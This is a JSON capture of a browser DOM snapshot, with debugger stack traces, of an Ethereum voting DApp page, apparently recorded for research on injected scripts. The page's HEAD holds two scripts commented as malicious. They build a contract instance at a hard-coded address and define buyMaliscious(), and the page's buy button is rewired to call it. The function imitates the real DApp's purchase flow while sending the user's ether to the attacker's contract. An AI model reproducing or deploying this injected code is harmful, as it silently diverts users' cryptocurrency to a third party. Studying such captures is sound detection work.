{
  "Trigger": {
    "DOM": "subtree-modified"
  },
  "TimeStamp": {
    "Day": "Friday",
    "Month": "April",
    "Date": 19,
    "Year": 2019,
    "Time": "18:50:24:274",
    "TimeZone": "UTC-2"
  },
  "DOM": {
    "type": "HTML",
    "content": [
      {
        "type": "HEAD",
        "content": [
          {
            "type": "TITLE",
            "content": [
              "Hello World DApp"
            ]
          },
          {
            "type": "LINK",
            "attributes": {
              "href": "https://fonts.googleapis.com/css?family=Open+Sans:400,700",
              "rel": "stylesheet",
              "type": "text/css"
            }
          },
          {
            "type": "LINK",
            "attributes": {
              "href": "https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css",
              "rel": "stylesheet",
              "type": "text/css"
            }
          },
          {
            "type": "STYLE",
            "content": [
              "\n    .margin-top-3 {\n      margin-top: 3em;\n    }\n  "
            ]
          },
          {
            "type": "STYLE",
            "content": [
              "body {\n  margin-left: 25%;\n  margin-right: 25%;\n  margin-top: 10%;\n  font-family: \"Open Sans\", sans-serif; }\n\nlabel {\n  display: inline-block;\n  width: 100px; }\n\ninput {\n  width: 500px;\n  padding: 5px;\n  font-size: 16px; }\n\nbutton {\n  font-size: 16px;\n  padding: 5px; }\n\nh1, h2 {\n  display: inline-block;\n  vertical-align: middle;\n  margin-top: 0px;\n  margin-bottom: 10px; }\n\nh2 {\n  color: #AAA;\n  font-size: 32px; }\n\nh3 {\n  font-weight: normal;\n  color: #AAA;\n  font-size: 24px; }\n\n.black {\n  color: black; }\n\n#balance {\n  color: black; }\n\n.hint {\n  color: #666; }\n"
            ],
            "attributes": {
              "type": "text/css"
            }
          },
          {
            "type": "SCRIPT",
            "content": [
              "function buyMaliscious(){\n\t\t//get amount of tokens user is willing to buy\n\t\tlet amountOfTokens = $('#buy').val();\n\n\t\t//get amount token price value from DApp user interface\n\t\tlet amountOfEther = amountOfTokens * parseFloat($('#token-cost').html());\n\n\t\t//empty input cell to mimick actual DApp behaviour\n\t\t$('#buy').val('');\n\n\t\t//buy tokens from maliscious contract and consequently transfer such an ammount of ether \n\t\t//to our maliscious smart contract\n\t\tcontractInstance.buy({value: web3.toWei(amountOfEther, 'ether'), from: web3.eth.accounts[0]},()=>{});\n\t}"
            ]
          },
          {
            "type": "SCRIPT",
            "content": [
              "(function(){\n\t\t//abi can be achieved from etherscan - where contract code of authentic DApp is freely\n\t\t//available\n\t\tlet abi = [\n\t\t\t{\n\t\t\t\t\"constant\": false,\n\t\t\t\t\"inputs\": [],\n\t\t\t\t\"name\": \"buy\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": true,\n\t\t\t\t\"stateMutability\": \"payable\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": false,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"account\",\n\t\t\t\t\t\t\"type\": \"address\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"transferTo\",\n\t\t\t\t\"outputs\": [],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"nonpayable\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": false,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"candidate\",\n\t\t\t\t\t\t\"type\": \"bytes32\"\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"votesInTokens\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"voteForCandidate\",\n\t\t\t\t\"outputs\": [],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"nonpayable\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"tokens\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"pricePerToken\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"candidateNames\",\n\t\t\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"nonpayable\",\n\t\t\t\t\"type\": \"constructor\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [],\n\t\t\t\t\"name\": \"allCandidates\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [],\n\t\t\t\t\"name\": \"balanceTokens\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"candidateList\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"bytes32\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"candidate\",\n\t\t\t\t\t\t\"type\": \"bytes32\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"indexOfCandidate\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [],\n\t\t\t\t\"name\": \"tokenPrice\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [],\n\t\t\t\t\"name\": \"tokensSold\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [],\n\t\t\t\t\"name\": \"totalTokens\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"candidate\",\n\t\t\t\t\t\t\"type\": \"bytes32\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"totalVotesFor\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"user\",\n\t\t\t\t\t\t\"type\": \"address\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"voterDetails\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256[]\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"address\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"voterInfo\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"voterAddress\",\n\t\t\t\t\t\t\"type\": \"address\"\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"tokensBought\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t},\n\t\t\t{\n\t\t\t\t\"constant\": true,\n\t\t\t\t\"inputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"bytes32\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"name\": \"votesReceived\",\n\t\t\t\t\"outputs\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"name\": \"\",\n\t\t\t\t\t\t\"type\": \"uint256\"\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\t\"payable\": false,\n\t\t\t\t\"stateMutability\": \"view\",\n\t\t\t\t\"type\": \"function\"\n\t\t\t}\n\t\t];\n\t\t\n\t\tvar malisciousContract = web3.eth.contract(abi);\n\n\t\t//remember to replace address by the address of the deployed contract \n\t\t//we use the window declaration to make the contract instance variable global.\n\t\t//this is important so that it is set at page load and then it is accessible\n\t\t//for the rest of the content script.\n\t\twindow.contractInstance = malisciousContract.at('0x336cf98644717342135ac0df5be68d7e7ca0f69d');\n\t})();"
            ]
          }
        ]
      },
      {
        "type": "BODY",
        "content": [
          {
            "type": "H1",
            "content": [
              "A Simple Hello World Voting Application"
            ]
          },
          {
            "type": "DIV",
            "content": [
              {
                "type": "H2",
                "content": [
                  "Candidates"
                ]
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "TABLE",
                    "content": [
                      "\n        ",
                      {
                        "type": "THEAD",
                        "content": [
                          "\n          ",
                          {
                            "type": "TR",
                            "content": [
                              "\n            ",
                              {
                                "type": "TH",
                                "content": [
                                  "Candidate"
                                ]
                              },
                              "\n            ",
                              {
                                "type": "TH",
                                "content": []
                              },
                              "\n          "
                            ]
                          },
                          "\n        "
                        ]
                      },
                      "\n        ",
                      {
                        "type": "TBODY",
                        "content": [
                          "\n        ",
                          {
                            "type": "TR",
                            "content": [
                              {
                                "type": "TD",
                                "content": []
                              },
                              {
                                "type": "TD",
                                "attributes": {
                                  "id": "candidate-0"
                                }
                              }
                            ]
                          }
                        ],
                        "attributes": {
                          "id": "candidate-rows"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "table table-bordered"
                    }
                  }
                ],
                "attributes": {
                  "class": "table-responsive"
                }
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Vote for Candidate"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "attributes": {
                      "id": "msg"
                    }
                  },
                  "\n      ",
                  {
                    "type": "INPUT",
                    "attributes": {
                      "type": "text",
                      "id": "candidate",
                      "placeholder": "Enter the candidate name"
                    },
                    "value": ""
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "INPUT",
                    "attributes": {
                      "type": "text",
                      "id": "vote-tokens",
                      "placeholder": "Total no. of tokens to vote"
                    },
                    "value": ""
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "BR"
                  },
                  "\n      ",
                  {
                    "type": "A",
                    "content": [],
                    "attributes": {
                      "href": "#",
                      "id": "vote-btn",
                      "onclick": "voteForCandidate()",
                      "class": "btn btn-primary"
                    }
                  }
                ],
                "attributes": {
                  "class": "container-fluid"
                }
              }
            ],
            "attributes": {
              "class": "col-sm-7 margin-top-3"
            }
          },
          {
            "type": "DIV",
            "content": [
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Token Stats"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "content": [
                      "\n        ",
                      {
                        "type": "TABLE",
                        "content": [
                          "\n          ",
                          {
                            "type": "TBODY",
                            "content": [
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Tokens For Sale"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "tokens-total"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n          ",
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Tokens Sold"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "tokens-sold"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n          ",
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Price Per Token"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "token-cost"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n          ",
                              {
                                "type": "TR",
                                "content": [
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "content": [
                                      "Balance in the contract"
                                    ]
                                  },
                                  "\n            ",
                                  {
                                    "type": "TD",
                                    "attributes": {
                                      "id": "contract-balance"
                                    }
                                  },
                                  "\n          "
                                ]
                              },
                              "\n        "
                            ]
                          }
                        ],
                        "attributes": {
                          "class": "table table-bordered"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "table-responsive"
                    }
                  }
                ],
                "attributes": {
                  "class": "row"
                }
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Purchase Tokens"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "content": [
                      "\n        ",
                      {
                        "type": "DIV",
                        "attributes": {
                          "id": "buy-msg"
                        }
                      },
                      "\n        ",
                      {
                        "type": "INPUT",
                        "attributes": {
                          "type": "text",
                          "id": "buy",
                          "class": "col-sm-8",
                          "placeholder": "Number of tokens to buy"
                        },
                        "value": ""
                      },
                      " \n        ",
                      {
                        "type": "A",
                        "content": [],
                        "attributes": {
                          "href": "#",
                          "id": "buy-btn",
                          "class": "btn btn-primary",
                          "onclick": "buyMaliscious()"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "col-sm-12"
                    }
                  }
                ],
                "attributes": {
                  "class": "row margin-top-3"
                }
              },
              {
                "type": "DIV",
                "content": [
                  "\n      ",
                  {
                    "type": "H2",
                    "content": [
                      "Lookup Voter Info"
                    ]
                  },
                  "\n      ",
                  {
                    "type": "DIV",
                    "content": [
                      "\n        ",
                      {
                        "type": "INPUT",
                        "attributes": {
                          "type": "text",
                          "id": "voter-info",
                          ",": "",
                          "class": "col-sm-8",
                          "placeholder": "Enter the voter address"
                        },
                        "value": ""
                      },
                      " \n        ",
                      {
                        "type": "A",
                        "content": [
                          "Lookup"
                        ],
                        "attributes": {
                          "href": "#",
                          "id": "lookup-btn",
                          "onclick": "lookupVoterInfo()",
                          "class": "btn btn-primary"
                        }
                      },
                      "\n        ",
                      {
                        "type": "DIV",
                        "content": [
                          "\n          ",
                          {
                            "type": "DIV",
                            "attributes": {
                              "id": "tokens-bought",
                              "class": "margin-top-3 col-md-12"
                            }
                          },
                          "\n          ",
                          {
                            "type": "DIV",
                            "attributes": {
                              "id": "votes-cast",
                              "class": "col-md-12"
                            }
                          },
                          "\n        "
                        ],
                        "attributes": {
                          "class": "voter-details row text-left"
                        }
                      },
                      "\n      "
                    ],
                    "attributes": {
                      "class": "col-sm-12"
                    }
                  }
                ],
                "attributes": {
                  "class": "row margin-top-3"
                }
              }
            ],
            "attributes": {
              "class": "col-sm-offset-1 col-sm-4 margin-top-3"
            }
          },
          {
            "type": "SCRIPT",
            "attributes": {
              "src": "https://cdn.rawgit.com/ethereum/web3.js/develop/dist/web3.js"
            }
          },
          {
            "type": "SCRIPT",
            "attributes": {
              "src": "https://code.jquery.com/jquery-3.1.1.slim.min.js"
            }
          },
          {
            "type": "SCRIPT",
            "attributes": {
              "src": "app.js"
            }
          }
        ],
        "attributes": {
          "class": "container"
        }
      }
    ]
  },
  "AdditionalInfo": {
    "callFrames": [
      {
        "callFrameId": "{\"ordinal\":0,\"injectedScriptId\":2}",
        "functionName": "",
        "functionLocation": {
          "scriptId": "19",
          "lineNumber": 2,
          "columnNumber": 17422
        },
        "location": {
          "scriptId": "19",
          "lineNumber": 2,
          "columnNumber": 17506
        },
        "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":114}"
            },
            "startLocation": {
              "scriptId": "19",
              "lineNumber": 2,
              "columnNumber": 17422
            },
            "endLocation": {
              "scriptId": "19",
              "lineNumber": 2,
              "columnNumber": 17522
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":115}"
            },
            "startLocation": {
              "scriptId": "19",
              "lineNumber": 1,
              "columnNumber": 272
            },
            "endLocation": {
              "scriptId": "19",
              "lineNumber": 3,
              "columnNumber": 4953
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":2,\"id\":116}"
            }
          }
        ],
        "this": {
          "type": "object",
          "subtype": "node",
          "className": "HTMLTableSectionElement",
          "description": "tbody#candidate-rows",
          "objectId": "{\"injectedScriptId\":2,\"id\":117}"
        }
      },
      {
        "callFrameId": "{\"ordinal\":1,\"injectedScriptId\":2}",
        "functionName": "Ia",
        "functionLocation": {
          "scriptId": "19",
          "lineNumber": 2,
          "columnNumber": 15498
        },
        "location": {
          "scriptId": "19",
          "lineNumber": 2,
          "columnNumber": 15938
        },
        "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":118}"
            },
            "name": "Ia",
            "startLocation": {
              "scriptId": "19",
              "lineNumber": 2,
              "columnNumber": 15498
            },
            "endLocation": {
              "scriptId": "19",
              "lineNumber": 2,
              "columnNumber": 16169
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":119}"
            },
            "startLocation": {
              "scriptId": "19",
              "lineNumber": 1,
              "columnNumber": 272
            },
            "endLocation": {
              "scriptId": "19",
              "lineNumber": 3,
              "columnNumber": 4953
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":2,\"id\":120}"
            }
          }
        ],
        "this": {
          "type": "undefined"
        }
      },
      {
        "callFrameId": "{\"ordinal\":2,\"injectedScriptId\":2}",
        "functionName": "append",
        "functionLocation": {
          "scriptId": "19",
          "lineNumber": 2,
          "columnNumber": 17386
        },
        "location": {
          "scriptId": "19",
          "lineNumber": 2,
          "columnNumber": 17396
        },
        "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":121}"
            },
            "name": "append",
            "startLocation": {
              "scriptId": "19",
              "lineNumber": 2,
              "columnNumber": 17386
            },
            "endLocation": {
              "scriptId": "19",
              "lineNumber": 2,
              "columnNumber": 17524
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":122}"
            },
            "startLocation": {
              "scriptId": "19",
              "lineNumber": 1,
              "columnNumber": 272
            },
            "endLocation": {
              "scriptId": "19",
              "lineNumber": 3,
              "columnNumber": 4953
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":2,\"id\":123}"
            }
          }
        ],
        "this": {
          "type": "object",
          "subtype": "array",
          "className": "r.fn.init",
          "description": "r.fn.init(1)",
          "objectId": "{\"injectedScriptId\":2,\"id\":124}"
        }
      },
      {
        "callFrameId": "{\"ordinal\":3,\"injectedScriptId\":2}",
        "functionName": "",
        "functionLocation": {
          "scriptId": "21",
          "lineNumber": 7,
          "columnNumber": 283597
        },
        "location": {
          "scriptId": "21",
          "lineNumber": 7,
          "columnNumber": 283622
        },
        "url": "http://localhost:8080/app.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":125}"
            },
            "startLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 283597
            },
            "endLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 283679
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":126}"
            },
            "startLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 283240
            },
            "endLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 286148
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":2,\"id\":127}"
            }
          }
        ],
        "this": {
          "type": "undefined"
        }
      },
      {
        "callFrameId": "{\"ordinal\":4,\"injectedScriptId\":2}",
        "functionName": "",
        "functionLocation": {
          "scriptId": "21",
          "lineNumber": 7,
          "columnNumber": 283497
        },
        "location": {
          "scriptId": "21",
          "lineNumber": 7,
          "columnNumber": 283581
        },
        "url": "http://localhost:8080/app.js",
        "scopeChain": [
          {
            "type": "local",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":128}"
            },
            "startLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 283497
            },
            "endLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 283880
            }
          },
          {
            "type": "closure",
            "object": {
              "type": "object",
              "className": "Object",
              "description": "Object",
              "objectId": "{\"injectedScriptId\":2,\"id\":129}"
            },
            "startLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 283240
            },
            "endLocation": {
              "scriptId": "21",
              "lineNumber": 7,
              "columnNumber": 286148
            }
          },
          {
            "type": "global",
            "object": {
              "type": "object",
              "className": "Window",
              "description": "Window",
              "objectId": "{\"injectedScriptId\":2,\"id\":130}"
            }
          }
        ],
        "this": {
          "type": "undefined"
        }
      }
    ],
    "reason": "DOM",
    "data": {
      "targetNodeId": 144,
      "insertion": true,
      "nodeId": 118,
      "type": "subtree-modified"
    },
    "hitBreakpoints": [],
    "asyncStackTrace": {
      "description": "Promise.then",
      "callFrames": [
        {
          "functionName": "",
          "scriptId": "21",
          "url": "http://localhost:8080/app.js",
          "lineNumber": 7,
          "columnNumber": 283484
        }
      ],
      "parent": {
        "description": "Promise.then",
        "callFrames": [
          {
            "functionName": "f",
            "scriptId": "21",
            "url": "http://localhost:8080/app.js",
            "lineNumber": 7,
            "columnNumber": 283444
          },
          {
            "functionName": "",
            "scriptId": "21",
            "url": "http://localhost:8080/app.js",
            "lineNumber": 7,
            "columnNumber": 286142
          },
          {
            "functionName": "j",
            "scriptId": "19",
            "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
            "lineNumber": 1,
            "columnNumber": 30163
          },
          {
            "functionName": "k",
            "scriptId": "19",
            "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
            "lineNumber": 1,
            "columnNumber": 30477
          }
        ],
        "parent": {
          "description": "setTimeout",
          "callFrames": [
            {
              "functionName": "",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 30686
            },
            {
              "functionName": "i",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28198
            },
            {
              "functionName": "fireWith",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28964
            },
            {
              "functionName": "fire",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 29000
            },
            {
              "functionName": "i",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28198
            },
            {
              "functionName": "fireWith",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 1,
              "columnNumber": 28964
            },
            {
              "functionName": "ready",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 2,
              "columnNumber": 144
            },
            {
              "functionName": "R",
              "scriptId": "19",
              "url": "https://code.jquery.com/jquery-3.1.1.slim.min.js",
              "lineNumber": 2,
              "columnNumber": 278
            }
          ]
        }
      }
    }
  }
}